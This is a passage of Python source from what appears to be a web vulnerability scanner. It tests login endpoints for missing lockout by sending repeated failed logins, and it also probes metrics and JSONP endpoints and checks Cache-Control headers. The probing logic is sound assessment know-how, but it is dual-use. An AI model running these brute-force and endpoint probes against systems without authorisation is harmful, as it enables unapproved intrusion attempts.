        r'[/_-](?:okta|saml|azure|adfs|ping|auth0|onelogin|duo|'
        r'cyberark|jumpcloud|keycloak|cognito)(?:[/_-]|$)'
        r'|/oauth2?/'
        r'|/\.well-known/openid',
        re.IGNORECASE,
    )
    _lm_sso_skip = False
    if login_url:
        _lm_login_path = urllib.parse.urlparse(login_url).path or ""
        if _LM_SSO_PATH_RE.search(_lm_login_path):
            _lm_sso_skip = True
            vc.log(
                f"[logging_monitoring] Login URL path contains IdP identifier "
                f"({_lm_login_path}) — authentication is delegated to an "
                f"external IdP; brute-force test skipped",
                "INFO",
            )
    if login_url and not _lm_sso_skip:
        # Keep the actual Response objects so each attempt can be saved as
        # req/resp evidence. Previous version stored only the status codes
        # and emitted the finding with no Evidence.
        _fail_attempts: "list[tuple[int, 'requests.Response | None', float]]" = []
        for _i in range(5):
            _start = time.time()
            try:
                r = sess.post(
                    login_url,
                    json={
                        "username": f"fracture_logging_probe_{_i}",
                        "password": "wrong_password_xyz",
                    },
                    timeout=timeout,
                )
                _fail_attempts.append(
                    (r.status_code, r, round(time.time() - _start, 3))
                )
            except Exception:
                _fail_attempts.append((0, None, round(time.time() - _start, 3)))
        fail_responses = [_sc for _sc, _, _ in _fail_attempts if _sc]
        # Detection signals that WOULD indicate brute-force protection:
        #   429  Too Many Requests   (rate-limited)
        #   423  Locked              (account lockout)
        #   401 with a Retry-After header
        #   Response body containing 'captcha', 'too many', 'locked',
        #     'try again later'
        #   Significant escalating latency between attempts (exponential
        #     backoff). Flagged but not used to gate the finding.
        if (len(fail_responses) == 5
                and all(s in (200, 302, 401) for s in fail_responses)):
            # No status-based protection. Also check bodies for captcha /
            # lockout text and reject the finding if any attempt shows it.
            _protection_marker = ""
            for _sc, _r, _ in _fail_attempts:
                if _r is None:
                    continue
                _body_lo = (_r.text or "")[:8000].lower()
                for _marker in ("captcha", "too many attempts",
                                "too many failed", "account locked",
                                "account temporarily locked",
                                "try again later", "rate limit",
                                "slow down"):
                    if _marker in _body_lo:
                        _protection_marker = _marker
                        break
                if _protection_marker:
                    break
            # ── JSON API body analysis ──────────────────────────────────
            # Many APIs (especially .NET / React SPAs) return HTTP 200 for
            # both success and failure, with the result communicated via a
            # JSON body field (e.g. {"success": false}).  In that case the
            # 200 status code carries no lockout information and the finding
            # would be a false positive.  Parse JSON bodies to detect:
            #   (a) JSON-level lockout/rate-limit fields → skip finding
            #   (b) Consistent JSON auth-failure bodies (all identical) →
            #       skip: can't determine lockout from uniform 200+JSON-error
            _json_api_skip = False
            if not _protection_marker:
                _json_bodies: list = []
                _is_json_api = False
                for _sc, _r, _ in _fail_attempts:
                    if _r is None:
                        continue
                    _ct = (_r.headers.get("Content-Type", "") or "").lower()
                    if "json" in _ct:
                        _is_json_api = True
                        try:
                            _jb = _r.json()
                            _json_bodies.append(_jb)
                        except Exception:
                            _json_bodies.append(None)
                if _is_json_api and _json_bodies:
                    # Check for JSON-level lockout indicators
                    _json_lockout_keys = (
                        "locked", "is_locked", "isLocked", "account_locked",
                        "accountLocked", "remaining_attempts",
                        "remainingAttempts", "rate_limited", "rateLimited",
                        "blocked", "isBlocked", "is_blocked", "retry_after",
                        "retryAfter", "lockout", "cooldown",
                    )
                    for _jb in _json_bodies:
                        if not isinstance(_jb, dict):
                            continue
                        _jb_keys_lo = {k.lower() for k in _jb}
                        for _jlk in _json_lockout_keys:
                            if _jlk.lower() in _jb_keys_lo:
                                _protection_marker = f"JSON field: {_jlk}"
                                break
                        if _protection_marker:
                            break
                    # Check for consistent JSON auth-failure responses.
                    # If every response is a JSON object indicating failure
                    # with effectively identical content, the API uses 200 for
                    # all results and we can't infer lockout absence from the
                    # status code.
                    if not _protection_marker:
                        # Case-insensitive key matching — ASP.NET APIs use
                        # PascalCase ("Success"), Node uses camelCase
                        # ("success"), Python uses snake_case ("is_valid").
                        _json_fail_keys = {
                            "success", "succeeded", "authenticated",
                            "isauthenticated", "is_authenticated",
                            "valid", "isvalid", "is_valid", "ok",
                            "result", "status", "loginsuccess",
                            "login_success", "auth_result",
                        }
                        _json_err_keys = {
                            "error", "message", "errormessage",
                            "error_message", "msg", "detail", "reason",
                            "description", "errors", "fault",
                            "exceptionmessage", "exception_message",
                        }
                        _json_fail_strs: list = []
                        for _jb in _json_bodies:
                            if not isinstance(_jb, dict):
                                continue
                            # Build case-insensitive key lookup
                            _jb_ci = {k.lower(): v for k, v in _jb.items()}
                            _found_fail = False
                            # Detect explicit failure flags (false/0/"false"/"fail"/"error")
                            for _jfk in _json_fail_keys:
                                _jfv = _jb_ci.get(_jfk)
                                if (_jfv is False or _jfv == 0
                                        or (isinstance(_jfv, str)
                                            and _jfv.lower() in (
                                                "false", "fail", "failed",
                                                "error", "invalid",
                                                "unauthorized", "denied",
                                            ))):
                                    _json_fail_strs.append(json.dumps(_jb, sort_keys=True))
                                    _found_fail = True
                                    break
                            if not _found_fail:
                                # Detect error message fields
                                for _jek in _json_err_keys:
                                    _jev = _jb_ci.get(_jek)
                                    if isinstance(_jev, str) and _jev:
                                        _json_fail_strs.append(json.dumps(_jb, sort_keys=True))
                                        _found_fail = True
                                        break
                            if not _found_fail:
                                # Last resort: if the JSON body is small
                                # (< 500 chars) and all responses are
                                # identical, it's likely a uniform error.
                                _json_fail_strs.append(json.dumps(_jb, sort_keys=True))
                        # If all JSON bodies indicate failure and are
                        # identical (same error for every attempt), the API
                        # properly rejects bad creds via JSON — the 200
                        # status is uninformative about lockout.
                        if (len(_json_fail_strs) == len(_json_bodies)
                                and len(set(_json_fail_strs)) == 1):
                            _json_api_skip = True
                            vc.log(
                                "[logging_monitoring] JSON API returns "
                                "identical auth-failure bodies for all "
                                "attempts (HTTP 200 + JSON error) — cannot "
                                "determine lockout behaviour from status "
                                "code alone; skipping finding.",
                                "INFO",
                            )
            if _protection_marker:
                vc.log(
                    f"[logging_monitoring] Brute-force protection signal "
                    f"detected in failed-login response body "
                    f"({_protection_marker!r}) — not emitting finding.",
                    "INFO",
                )
            elif _json_api_skip:
                pass  # already logged above
            else:
                # Save evidence: each failed attempt's req + resp as a
                # JSON-array of HTTP-exchange dicts.
                _evidence_entries: list = []
                for _i, (_sc, _r, _latency) in enumerate(_fail_attempts, 1):
                    if _r is None:
                        continue
                    try:
                        _rq, _rp = _save_http_evidence(
                            out, phase,
                            f"auth_failure_attempt_{_i}_{hostname}",
                            _r,
                        )
                        _evidence_entries.append({
                            "url": f"Attempt {_i}/5 → POST {login_url} "
                                   f"(HTTP {_sc}, {_latency}s)",
                            "req":  str(_rq),
                            "resp": str(_rp),
                        })
                    except Exception:
                        pass
                # Latency check — escalating delay between attempts hints
                # at server-side exponential backoff even when the status
                # code stays 401. Worth surfacing in the output text.
                _latencies = [round(_l, 3) for _, _, _l in _fail_attempts]
                _latency_escalating = (
                    len(_latencies) >= 3
                    and _latencies[-1] > _latencies[0] * 2
                )
                out.add_finding(
                    title="Insufficient Auth Failure Logging / No Brute-Force Detection",
                    url=login_url, port=target["port"], risk="MEDIUM",
                    description=(
                        f"Five consecutive failed login attempts to "
                        f"{login_url} were accepted without triggering a "
                        f"lockout (HTTP 423), rate-limit (HTTP 429), "
                        f"captcha challenge, or any 'too many attempts' / "
                        f"'account locked' / 'try again later' body marker. "
                        f"No Retry-After header or escalating server-side "
                        f"latency was observed either. Brute-force attacks "
                        f"against this login endpoint will not be detected "
                        f"or throttled by the application itself; defence "
                        f"depends entirely on upstream rate-limiting (WAF "
                        f"/ CDN) or post-hoc log review."
                    ),
                    output=(
                        f"Login URL:           {login_url}\n"
                        f"Attempts:            5\n"
                        f"Status codes:        {fail_responses}\n"
                        f"Per-attempt latency: {_latencies} seconds\n"
                        f"Escalating latency:  "
                        f"{_latency_escalating} (would suggest exponential backoff)\n"
                        f"Captcha / lockout body markers detected: none\n"
                        f"Retry-After headers detected: none"
                    ),
                    output_file=(
                        json.dumps(_evidence_entries)
                        if _evidence_entries else ""
                    ),
                    sources="fracture-logging", service=target["scheme"],
                    affected=login_url,
                    owasp="A09:2025 Security Logging and Monitoring Failures",
                    nist="AU-12",
                    remediation=(
                        "Implement brute-force detection and account lockout "
                        "after N failed attempts. Log all authentication "
                        "failures with IP, timestamp, and username. Alert "
                        "on anomalous login-failure patterns. Server-side "
                        "exponential backoff or CAPTCHA challenges after "
                        "3 failures are the minimum bar."
                    ),
                )
                vc.log(
                    f"[logging_monitoring] No brute-force protection: "
                    f"{login_url}",
                    "SUCCESS",
                )

    # 5. Prometheus / metrics endpoint exposure
    vc.status(phase, "Logging & Monitoring", "running", "Metrics endpoints", 4, 7)
    _metrics_paths = ["/metrics", "/prometheus", "/prometheus/metrics",
                      "/internal/metrics", "/ops/metrics"]
    for mpath in _metrics_paths:
        murl = url.rstrip("/") + mpath
        try:
            r = sess.get(murl, timeout=timeout, allow_redirects=False)
            if r and r.status_code == 200 and re.search(r'^#\s+HELP\s+|^#\s+TYPE\s+|\bprocess_cpu\b|\bgo_goroutines\b', r.text, re.M):
                _met_ev = ""
                try:
                    _met_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', mpath)[:30]
                    _met_rq, _met_rp = _save_http_evidence(
                        out, phase, f"metrics_{_met_safe}", r)
                    _met_ev = json.dumps(
                        [{"url": murl, "req": str(_met_rq), "resp": str(_met_rp)}])
                except Exception:
                    pass
                out.add_finding(
                    title="Exposed Metrics Endpoint with Sensitive Data",
                    url=murl, port=target["port"], risk="MEDIUM",
                    description=(f"A Prometheus-format metrics endpoint was found at {murl} without "
                                 f"authentication. It exposes internal process metrics, request counters, "
                                 f"and potentially sensitive timing and resource data."),
                    output=f"GET {murl} → HTTP {r.status_code}\n{r.text[:500]}",
                    sources="fracture-logging", service=target["scheme"],
                    output_file=_met_ev,
                    affected=murl, owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                    remediation="Restrict /metrics and /prometheus endpoints to localhost or a monitoring network. Require authentication.",
                )
                vc.log(f"[logging_monitoring] Prometheus metrics: {murl}", "SUCCESS")
        except Exception:
            pass

    # 6. JSONP endpoint detection via callback parameter on discovered paths
    vc.status(phase, "Logging & Monitoring", "running", "JSONP endpoints (recon)", 5, 7)
    _jsonp_probe_paths = ["/api/user", "/api/data", "/data", "/export", "/feed",
                          "/api/profile", "/user/info", "/api/json"]
    _jsonp_wrap_re2 = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*\s*\(', re.M)
    for jpath in _jsonp_probe_paths:
        jurl = url.rstrip("/") + jpath + "?callback=fracture_jsonp_check"
        try:
            r = sess.get(jurl, timeout=timeout, allow_redirects=False)
            if r and r.status_code == 200:
                if "fracture_jsonp_check" in r.text and _jsonp_wrap_re2.search(r.text[:100]):
                    _jp2_ev = ""
                    try:
                        _jp2_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', jpath)[:30]
                        _jp2_rq, _jp2_rp = _save_http_evidence(
                            out, phase, f"jsonp_lm_{_jp2_safe}", r)
                        _jp2_ev = json.dumps(
                            [{"url": jurl, "req": str(_jp2_rq), "resp": str(_jp2_rp)}])
                    except Exception:
                        pass
                    out.add_finding(
                        title="JSONP Endpoint — Cross-Origin Data Leakage",
                        url=url.rstrip("/") + jpath, port=target["port"], risk="HIGH",
                        description=(f"JSONP endpoint found at {jpath}. The 'callback' parameter is "
                                     f"reflected as a JavaScript function name wrapping the response body. "
                                     f"An attacker can embed a <script> tag to exfiltrate the response from any domain."),
                        output=f"GET {jurl} → HTTP {r.status_code}\n{r.text[:300]}",
                        sources="fracture-logging", service=target["scheme"],
                        output_file=_jp2_ev,
                        affected=url.rstrip("/") + jpath,
                        owasp="A05:2025 Security Misconfiguration", nist="SC-8",
                        remediation="Remove JSONP support and use CORS with an origin allowlist instead.",
                    )
                    vc.log(f"[logging_monitoring] JSONP endpoint: {jpath}", "SUCCESS")
        except Exception:
            pass

    # 7. Missing Cache-Control on sensitive pages
    vc.status(phase, "Logging & Monitoring", "running", "Cache-Control on sensitive pages", 6, 7)
    _sensitive_paths_cc = ["/login", "/profile", "/account", "/dashboard",
                           "/admin", "/settings", "/password", "/reset"]
    for spath in _sensitive_paths_cc:
        surl = url.rstrip("/") + spath
        try:
            r = sess.get(surl, timeout=timeout, allow_redirects=False)
            if r and r.status_code == 200:
                cc = r.headers.get("Cache-Control", "")
                pragma = r.headers.get("Pragma", "")
                if not re.search(r'no-store|no-cache|private|must-revalidate', cc, re.I) \
                        and "no-cache" not in pragma.lower():
                    _cc_ev = ""
                    try:
                        _cc_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', spath)[:30]
                        _cc_rq, _cc_rp = _save_http_evidence(
                            out, phase, f"cache_ctrl_{_cc_safe}", r)
                        _cc_ev = json.dumps(
                            [{"url": surl, "req": str(_cc_rq), "resp": str(_cc_rp)}])
                    except Exception:
                        pass
                    out.add_finding(
                        title="Missing Cache-Control on Sensitive Page",
                        url=surl, port=target["port"], risk="LOW",
                        description=(f"The sensitive page {spath} is missing Cache-Control: no-store / no-cache. "
                                     f"Browsers and intermediate proxies may cache the response, "
                                     f"exposing sensitive data to users of shared computers."),
                        output=f"GET {surl} → HTTP {r.status_code}\nCache-Control: {cc or '(absent)'}\nPragma: {pragma or '(absent)'}",
                        sources="fracture-logging", service=target["scheme"],
                        output_file=_cc_ev,
                        affected=surl, owasp="A05:2025 Security Misconfiguration", nist="SC-28",
                        remediation="Add 'Cache-Control: no-store, no-cache, private' and 'Pragma: no-cache' to all authenticated and sensitive pages.",
                    )
                    vc.log(f"[logging_monitoring] Missing Cache-Control: {spath}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Logging & Monitoring", "complete", "Done", 7, 7)
    vc.log("[logging_monitoring] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 7b: Account Lockout (alongside auth_bypass)
# ─────────────────────────────────────────────
_LOCKOUT_USERNAME_FIELDS = re.compile(r'user|email|login|name|account', re.I)
_LOCKOUT_PASSWORD_FIELDS = re.compile(r'pass|pwd|secret|credential', re.I)


def _phase_account_lockout(target: dict, cfg: dict, pm: ProgressManager,
                            out: OutputManager, sess: requests.Session,
                            crawl_data: dict) -> None:
    """Phase 7b: Account lockout and brute-force protection testing."""
    phase   = "account_lockout"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])

    vc.status(phase, "Account Lockout", "running", "Identifying login forms", 0, 3)

    # Identify login forms
    login_forms = []
    for form in forms:
        inputs = form.get("inputs", [])
        has_user = any(_LOCKOUT_USERNAME_FIELDS.search(i.get("name", "") + i.get("type", ""))
                       for i in inputs)
        has_pass = any(i.get("type", "").lower() == "password" or
                       _LOCKOUT_PASSWORD_FIELDS.search(i.get("name", ""))
                       for i in inputs)
        if has_user and has_pass:
            login_forms.append(form)

    # Also try configured login URL
    login_url = cfg.get("auth", {}).get("login_url", "")
    if login_url and not login_forms:
        login_forms = [{"action": login_url, "method": "POST",
                        "inputs": [{"name": "username"}, {"name": "password", "type": "password"}]}]

    vc.status(phase, "Account Lockout", "running", "Brute-force simulation", 1, 3)
    _lockout_results: list = []   # collected results for merged finding
    for form in login_forms[:3]:
        action = form.get("action", url)
        method = form.get("method", "POST").upper()
        inputs = form.get("inputs", [])

        user_field = next(
            (i["name"] for i in inputs if _LOCKOUT_USERNAME_FIELDS.search(
                i.get("name", "") + i.get("type", ""))), "username"
        )
        pass_field = next(
            (i["name"] for i in inputs
             if i.get("type", "").lower() == "password" or
             _LOCKOUT_PASSWORD_FIELDS.search(i.get("name", ""))), "password"
        )

        # ── Harvest hidden form fields ──
        # ASP.NET WebForms (ViewState, EventValidation), CSRF tokens,
        # and other stateful login pages require hidden fields to
        # process a postback.  Without them the server silently re-
        # renders the blank page — the login is never attempted.
        _hidden_fields: dict = {}
        _baseline_size = 0
        if method == "POST":
            try:
                _form_page = sess.get(action, timeout=timeout)
                if _form_page.status_code == 200:
                    _baseline_size = len(_form_page.content)
                    for _hm in re.finditer(
                        r'<input[^>]+type=["\']?hidden["\']?[^>]*>',
                        _form_page.text, re.I,
                    ):
                        _htag = _hm.group(0)
                        _hn = re.search(r'name=["\']([^"\']+)["\']', _htag)
                        _hv = re.search(r'value=["\']([^"\']*)["\']', _htag)
                        if _hn:
                            _hidden_fields[_hn.group(1)] = _hv.group(1) if _hv else ""
                    if _hidden_fields:
                        vc.log(
                            f"[account_lockout] Harvested {len(_hidden_fields)} hidden "
                            f"field(s) from {action} (baseline {_baseline_size}B)",
                            "INFO",
                        )
            except Exception:
                pass

        # ── URL-path SSO guard ────────────────────────────────────
        # SPAs serve a JS shell — the Okta/SAML redirect happens
        # client-side, so HTML inspection finds no SSO markers.
        # Detect IdP names embedded in the login URL path itself.
        _SSO_PATH_RE = re.compile(
            r'[/_-](?:okta|saml|azure|adfs|ping|auth0|onelogin|duo|'
            r'cyberark|jumpcloud|keycloak|cognito)(?:[/_-]|$)'
            r'|/oauth2?/'
            r'|/\.well-known/openid',
            re.IGNORECASE,
        )
        _action_path = urllib.parse.urlparse(action).path or ""
        if _SSO_PATH_RE.search(_action_path):
            vc.log(
                f"[account_lockout] Login URL path contains IdP identifier "
                f"({_action_path}) — authentication is delegated to an "
                f"external IdP; rate-limiting is enforced there. "
                f"Skipping: {action}",
                "INFO",
            )
            continue

        # ── SAML / SSO guard (HTML-based) ────────────────────────
        # If the login page advertises an external IdP (SAML, CyberArk,
        # Okta, Azure AD, PingFederate, ADFS, Auth0, OneLogin, etc.),
        # the real auth flow goes through the IdP.  A direct POST to the
        # local endpoint is rejected or ignored — 403/302 responses
        # reflect the IdP enforcement, not missing rate-limiting.
        # Also detect CSP form-action headers pointing to external IdPs.
        _SSO_PAGE_RE = re.compile(
            r'saml\s+login|saml.sso|/saml2?/|/adfs/|'
            r'/auth/realms/|/oauth2/|/\.well-known/openid|'
            r'sso\s+login|single\s+sign.on|'
            r'(?:use|login\s+with|sign\s+in\s+with)\s+(?:sso|saml|okta|azure|'
            r'ping|adfs|onelogin|auth0|duo|cyberark|jumpcloud)',
            re.IGNORECASE,
        )
        _SSO_IDP_DOMAINS = re.compile(
            r'(?:\.okta\.com|\.auth0\.com|\.onelogin\.com|'
            r'login\.microsoftonline\.com|adfs\.|'
            r'\.pingidentity\.com|\.pingone\.com|'
            r'\.duosecurity\.com|\.duo\.com|'
            r'id\.cyberark\.cloud|auth\.alero\.io|'
            r'\.jumpcloud\.com|accounts\.google\.com|'
            r'\.pphosted\.com(?::\d+)?/saml)',
            re.IGNORECASE,
        )
        _sso_detected = False
        _sso_reason = ""
        if method == "POST" and _baseline_size > 0:
            _fp_text = _form_page.text if '_form_page' in dir() else ""
            if _fp_text:
                if _SSO_PAGE_RE.search(_fp_text[:16000]):
                    _sso_detected = True
                    _sso_reason = "SAML/SSO login UI detected on page"
                if not _sso_detected:
                    _fp_csp = (_form_page.headers.get(
                        "Content-Security-Policy", "") if '_form_page' in dir() else "")
                    _fa_match = re.search(r'form-action\s+([^;]+)', _fp_csp, re.I)
                    if _fa_match and _SSO_IDP_DOMAINS.search(_fa_match.group(1)):
                        _sso_detected = True
                        _sso_reason = (
                            "CSP form-action references external IdP: "
                            + _fa_match.group(1).strip()[:120]
                        )
                if not _sso_detected:
                    for _fm_a in re.finditer(
                        r'<form[^>]+action=["\']([^"\']+)["\']', _fp_text[:16000], re.I
                    ):
                        if _SSO_IDP_DOMAINS.search(_fm_a.group(1)):
                            _sso_detected = True
                            _sso_reason = (
                                "Form action points to external IdP: "
                                + _fm_a.group(1)[:120]
                            )
                            break
                if not _sso_detected:
                    for _a_tag in re.finditer(
                        r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>([^<]{0,80})',
                        _fp_text[:16000], re.I,
                    ):
                        _a_href = _a_tag.group(1)
                        _a_text = _a_tag.group(2)
                        if (_SSO_IDP_DOMAINS.search(_a_href)
                                or re.search(r'saml\s+login|sso\s+login', _a_text, re.I)):
                            _sso_detected = True
                            _sso_reason = (
                                "SAML/SSO link on login page: "
                                + _a_text.strip()[:60] + " → " + _a_href[:80]
                            )
                            break
        if _sso_detected:
            vc.log(
                f"[account_lockout] {_sso_reason} — authentication is "
                f"delegated to an external IdP; rate-limiting is enforced "
                f"there, not on the local endpoint. Skipping: {action}",
                "INFO",
            )
            continue

        status_codes: list = []
        probe_responses: list = []  # requests.Response objects for evidence
        probe_times: list = []      # response times in seconds
        _last_r = None
        for attempt in range(10):
            data = {**_hidden_fields, user_field: "fracture_test_user",
                    pass_field: f"wrong_pass_{attempt}"}
            try:
                import time as _time_lockout
                _t0 = _time_lockout.monotonic()
                _last_r = (sess.post(action, data=data, timeout=timeout, allow_redirects=True)
                           if method == "POST"
                           else sess.get(action, params=data, timeout=timeout))
                _elapsed = _time_lockout.monotonic() - _t0
                status_codes.append(_last_r.status_code)
                probe_responses.append(_last_r)
                probe_times.append(round(_elapsed, 2))
                # Re-parse hidden fields from this response for the next
                # attempt (ASP.NET rotates ViewState on every postback).
                if method == "POST" and _hidden_fields and _last_r.text:
                    _new_hf: dict = {}
                    for _hm2 in re.finditer(
                        r'<input[^>]+type=["\']?hidden["\']?[^>]*>',
                        _last_r.text, re.I,
                    ):
                        _htag2 = _hm2.group(0)
                        _hn2 = re.search(r'name=["\']([^"\']+)["\']', _htag2)
                        _hv2 = re.search(r'value=["\']([^"\']*)["\']', _htag2)
                        if _hn2:
                            _new_hf[_hn2.group(1)] = _hv2.group(1) if _hv2 else ""
                    if _new_hf:
                        _hidden_fields = _new_hf
                # Check for lockout/captcha indicators
                if re.search(r'locked|captcha|too many|rate.limit|try.again.later|'
                             r'account.*disabled|temporarily.*unavail', _last_r.text, re.I):
                    vc.log(f"[account_lockout] Lockout triggered after {attempt+1} attempts", "INFO")
                    break
            except Exception:
                pass

        # 405 Method Not Allowed means the endpoint rejects the HTTP method entirely —
        # the authentication logic is never reached, so no conclusion about rate limiting
        # can be drawn. Skip the finding; log the method mismatch for visibility.
        # Similarly skip on 404/501 which indicate the endpoint does not exist at all.
        _invalid_method_codes = {405, 404, 501}
        if status_codes and all(s in _invalid_method_codes for s in status_codes):
            _dominant = max(set(status_codes), key=status_codes.count)
            vc.log(
                f"[account_lockout] All {len(status_codes)} probes returned HTTP {_dominant} "
                f"on {action} — endpoint does not accept {method} requests; "
                "rate-limiting cannot be assessed via this method. Skipping finding.",
                "INFO",
            )
            continue

        # All-403 with generic error page — the endpoint is rejecting the request
        # wholesale (e.g. SAML-only auth rejecting direct POSTs, or WAF blocking).
        # A 403 "Forbidden" page without auth-failure phrases is not evidence of
        # missing rate-limiting; it means the auth logic was never reached.
        _GENERIC_ERR_RE = re.compile(
            r'Error\s+403\s*[-–—:]\s*Forbidden|'
            r'<title>\s*(?:Error\s+)?(?:403|401|Forbidden|Unauthorized)\b',
            re.IGNORECASE,
        )
        if status_codes and all(s == 403 for s in status_codes):
            _has_auth_err = False
            _auth_fail_re = re.compile(
                r'\b(?:invalid|incorrect|wrong)\s+(?:user|pass|cred|login)|'
                r'bad\s+(?:credentials?|password|login)|'
                r'authentication\s+failed|login\s+failed',
                re.IGNORECASE,
            )
            for _pr403 in probe_responses[:3]:
                _t403 = _pr403.text or ""
                if _auth_fail_re.search(re.sub(r'<[^>]+>', ' ', _t403[:4000])):
                    _has_auth_err = True
                    break
            if not _has_auth_err:
                _is_generic = any(
                    _GENERIC_ERR_RE.search((_pr403.text or "")[:4000])
                    for _pr403 in probe_responses[:3]
                )
                if _is_generic or not any(
                    re.search(r'<input[^>]+type=["\']?password["\']?',
                              (_pr403.text or "")[:4000], re.I)
                    for _pr403 in probe_responses[:3]
                ):
                    vc.log(
                        f"[account_lockout] All {len(status_codes)} probes returned "
                        f"HTTP 403 on {action} with generic error page (no auth-failure "
                        "text, no login form) — endpoint is rejecting requests outright, "
                        "not processing authentication. Skipping finding.",
                        "INFO",
                    )
                    continue

        if len(status_codes) >= 10:
            # Before firing, verify the endpoint was actually processing auth
            # attempts and not just returning a static page for every request.
            # False-positive sources: endpoints that return 200 for unrelated
            # reasons, or login pages that use HTTP 200 for soft-fails without
            # any detectable lockout or rate-limiting behaviour.
            # Require at least one probe to exhibit an auth-processing signal:
            #   (a) URL of response matches the login action (stayed on login page)
            #   (b) Response body still contains a password input (login form present)
            #   (c) Response body contains an auth-failure phrase
            _auth_processing_confirmed = False
            _lockout_skip_phrases = re.compile(
                r'\b(?:invalid|incorrect|failed|wrong|denied|'
                r'username\s+or\s+password|bad\s+(?:credentials?|login)|'
                r'try\s+again|please\s+enter|sign\s+in\s+again)\b',
                re.IGNORECASE,
            )
            _GENERIC_HTTP_ERR_RE = re.compile(
                r'<title>\s*(?:Error\s+)?\d{3}\s*[-–—:]\s*\w|'
                r'Error\s+\d{3}\s*[-–—:]\s*(?:Forbidden|Unauthorized|Not Found)',
                re.IGNORECASE,
            )
            for _chk_r in probe_responses[:5]:
                _chk_text  = _chk_r.text or ""
                _chk_path  = urllib.parse.urlparse(_chk_r.url).path.rstrip("/")
                _act_path  = urllib.parse.urlparse(action).path.rstrip("/")
                _has_form  = bool(re.search(
                    r'<input[^>]+type=["\']?password["\']?', _chk_text, re.I))
                _has_err   = bool(_lockout_skip_phrases.search(
                    re.sub(r'<[^>]+>', ' ', _chk_text[:4000])))
                _stayed_on = (_chk_path == _act_path)
                # Path match alone is not enough when the response is a generic
                # HTTP error page (e.g. "Error 403 - Forbidden").  The server
                # served the error at the same URL but never processed the login.
                if _stayed_on and not _has_form and not _has_err:
                    if (_chk_r.status_code in (401, 403)
                            and _GENERIC_HTTP_ERR_RE.search(_chk_text[:4000])):
                        _stayed_on = False
                if _stayed_on or _has_form or _has_err:
                    _auth_processing_confirmed = True
                    break
            if not _auth_processing_confirmed:
                vc.log(
                    f"[account_lockout] Probe responses for {action} show no auth "
                    "processing signals (no form, no error text, no URL match) "
                    "— skipping finding to avoid false positive",
                    "INFO",
                )
                continue
            # Also skip if all responses redirect away from the login URL
            # (could indicate successful auth with the dummy credentials, which
            # would mean the endpoint returned 200 from the redirect destination,
            # not that rate-limiting is absent).
            _action_host = urllib.parse.urlparse(action).netloc
            _all_redirected_away = all(
                urllib.parse.urlparse(r.url).netloc != _action_host
                or urllib.parse.urlparse(r.url).path.rstrip("/") not in (
                    urllib.parse.urlparse(action).path.rstrip("/"), "")
                for r in probe_responses
            )
            if _all_redirected_away and not any(
                    bool(re.search(r'<input[^>]+type=["\']?password["\']?',
                                   r.text or "", re.I))
                    for r in probe_responses[:3]):
                vc.log(
                    f"[account_lockout] All probe responses for {action} redirected "
                    "away from login page — possible auth success with dummy creds; "
                    "skipping rate-limit finding to avoid false positive",
                    "WARNING",
                )
                continue
            # JSON API check — APIs that use HTTP 200 for both success and
            # failure communicate the result via a JSON body field.  When
            # every probe returns an identical JSON auth-failure body, the
            # 200 status code carries no lockout information.
            _json_lockout_skip = False
            _json_bodies_7b: list = []
            _is_json_7b = False
            for _pr in probe_responses:
                _pct = (_pr.headers.get("Content-Type", "") or "").lower()
                if "json" in _pct:
                    _is_json_7b = True
                    try:
                        _json_bodies_7b.append(_pr.json())
                    except Exception:
                        _json_bodies_7b.append(None)
            if _is_json_7b and _json_bodies_7b:
                _jl_keys = (
                    "locked", "is_locked", "isLocked", "account_locked",
                    "accountLocked", "remaining_attempts",
                    "remainingAttempts", "rate_limited", "rateLimited",
                    "blocked", "isBlocked", "is_blocked", "retry_after",
                    "retryAfter", "lockout", "cooldown",
                )
                for _jb7 in _json_bodies_7b:
                    if isinstance(_jb7, dict):
                        _jb7_lo = {k.lower() for k in _jb7}
                        if any(_jk.lower() in _jb7_lo for _jk in _jl_keys):
                            _json_lockout_skip = True
                            break
                if not _json_lockout_skip:
                    _jf_keys = ("success", "succeeded", "authenticated",
                                "isAuthenticated", "valid", "ok")
                    _je_keys = ("error", "message", "errorMessage",
                                "error_message", "msg", "detail", "reason")
                    _jf_strs: list = []
                    for _jb7 in _json_bodies_7b:
                        if not isinstance(_jb7, dict):
                            continue
                        for _jfk in _jf_keys:
                            _jfv = _jb7.get(_jfk)
                            if _jfv is False or _jfv == 0:
                                _jf_strs.append(json.dumps(_jb7, sort_keys=True))
                                break
                        else:
                            for _jek in _je_keys:
                                if isinstance(_jb7.get(_jek), str) and _jb7[_jek]:
                                    _jf_strs.append(json.dumps(_jb7, sort_keys=True))
                                    break
                    if (len(_jf_strs) == len(_json_bodies_7b)
                            and len(set(_jf_strs)) == 1):
                        _json_lockout_skip = True
            if _json_lockout_skip:
                vc.log(
                    f"[account_lockout] JSON API at {action} returns "
                    "identical auth-failure bodies for all probes "
                    "(HTTP 200 + JSON error) — cannot determine lockout "
                    "from status code alone; skipping.",
                    "INFO",
                )
                continue
            # Check for progressive delays — if later attempts are significantly
            # slower, the server may be implementing rate limiting via delay.
            _has_progressive_delay = False
            if len(probe_times) >= 6:
                _early_avg = sum(probe_times[:3]) / 3
                _late_avg = sum(probe_times[-3:]) / 3
                if _late_avg > _early_avg * 2.0 and _late_avg > 2.0:
                    _has_progressive_delay = True
                    vc.log(
                        f"[account_lockout] Progressive delay detected at {action}: "
                        f"early avg {_early_avg:.1f}s → late avg {_late_avg:.1f}s",
                        "INFO",
                    )
                    continue  # Server IS rate limiting via delay — skip finding

            # Also check for body-size variation — if later responses grow
            # (e.g. CAPTCHA inserted), the server IS protecting.
            _sizes = [len(r.content) for r in probe_responses]
            if len(_sizes) >= 6:
                _early_sz = sum(_sizes[:3]) / 3
                _late_sz = sum(_sizes[-3:]) / 3
                if abs(_late_sz - _early_sz) > max(200, _early_sz * 0.10):
                    vc.log(
                        f"[account_lockout] Response size changed at {action}: "
                        f"early avg {_early_sz:.0f}B → late avg {_late_sz:.0f}B "
                        "(possible CAPTCHA/lockout insertion) — skipping",
                        "INFO",
                    )
                    continue

